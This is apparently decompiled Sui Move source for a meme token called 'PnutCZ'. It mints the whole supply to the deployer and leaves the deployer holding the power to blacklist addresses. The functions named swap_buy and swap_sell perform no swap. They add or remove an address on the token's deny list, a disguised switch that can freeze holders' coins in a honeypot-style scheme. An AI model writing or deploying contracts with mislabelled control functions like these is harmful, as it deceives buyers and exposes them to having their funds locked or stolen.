module 0x78e6f137f4e0da512b6c0c706c900d3cdd711bd38487e79e5e17386423ad55d6::pnutcz {
    struct PNUTCZ has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PNUTCZ, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PNUTCZ>(arg0, 9, b"PnutCZ", b"First Connected Squirrel with CZ", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZKuhvsb4PjwuhbCqyKfrdWtpGfk1P3LYvPi7pSpTVvjV"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PNUTCZ>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PNUTCZ>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PNUTCZ>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PNUTCZ>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PNUTCZ>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PNUTCZ>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PNUTCZ>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PNUTCZ>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

